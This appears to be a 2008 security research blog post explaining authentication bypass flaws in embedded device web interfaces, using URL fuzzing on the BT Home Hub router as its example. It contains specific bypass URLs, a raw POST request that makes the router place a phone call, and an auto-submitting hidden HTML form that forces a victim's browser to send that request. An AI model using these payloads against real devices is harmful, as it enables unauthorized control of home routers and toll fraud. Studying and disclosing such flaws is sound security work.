---
title: Holes In Embedded Devices Authentication Bypass (pt 1)
author: adrian-pastor
date: Thu, 14 Feb 2008 12:13:33 GMT
template: this/views/post.jade
---

Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!

After performing my own research and going through authentication bypass bugs on embedded devices published by other peers in the community, I came to the conclusion that these bugs are usually (or at least quite often) very simple flaws in web interfaces. Once you find one of these bugs they are usually trivial to exploit, and remind you of web vulnerabilities that you would expect finding in the 90s, but not these days.

The fact that embedded devices are very primitive in terms of hardware, ultimately means that the security of the software running on them is also sacrificed. Most of the authentication bypass bugs found on web interfaces of embedded devices fall into one of the following categories:

* URL fuzzing a.k.a. additional representation of URLs
* A-to-C attacks a.k.a. knowledge of "post-authentication" URLs
* Unchecked HTTP methods
* Unchecked administrative HTTP requests aka unprotected cgi scripts
* Unprotected redirects

We will go through all these authentication bypass bugs in detail. For this post, we will only cover the first type: URL fuzzing a.k.a. additional representation of URLs<.

## Authentication bypass via URL fuzzing

URL fuzzing targets bugs in the web server or server-side scripts that are part of the web console of an embedded device. These bugs could be due to a poorly-written regex, and finding them is all about finding alternative ways to represent a URL that would usually grant access to administrative functionalities. Sometimes, there are multiple ways a URL can be represented which is still understood by the target device, but causes the device to not require the user to enter a password.

For instance, the BT Home Hub, which is the most popular DSL router in the UK is [vulnerable](/blog/bt-home-flub-pwnin-the-bt-home-hub-4) to an authentication bypass bug due to the device accepting multiple representations of the same URL as valid, but only checking for password when submitting URLs in their original form. For example, the URL for accessing the firewall settings looks like: `http://bthomehub/cgi/b/secpol/cfg/` or `http://bthomehub/cgi/b/secpol/cfg/?ce=1&be=1&l0=4&l1=7` (they're both equivalent). However, appending various characters after the directory path allows attackers to completely bypass the authentication prompt:

* http://bthomehub/cgi/b/secpol/cfg/%5C
* http://bthomehub/cgi/b/secpol/cfg//
* http://bthomehub/cgi/b/secpol/cfg/%
* http://bthomehub/cgi/b/secpol/cfg/~

...and so on. The same technique could be used in this case not only to retrieve administrative settings, but also to make administrative changes. The only difference is that the requests must be submitted as POST rather than GET, but we still append the special characters to the URL the POST request is submitted to.For instance, the following POST request causes the BT Home Hub to call the Internet Office of the Holy See. Notice the double slash in the POST URL:

```http
POST /cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name= HTTP/1.1
Host: bthomehub

0=30&1=00390669893461
```

Such requests could be submitted by the victim's web browser via a HTML form with a `method="POST"` attribute:

```html
<html>
<body>
<form name="form" method="POST" enctype="application/x-www-form-urlencoded" action="http://bthomehub/cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name=">
<input type="hidden" name="0" value="30"/>
<input type="hidden" name="1" value="00390669893461"/>
</form>
<script>form.submit()</script>
</body>
</html>
```
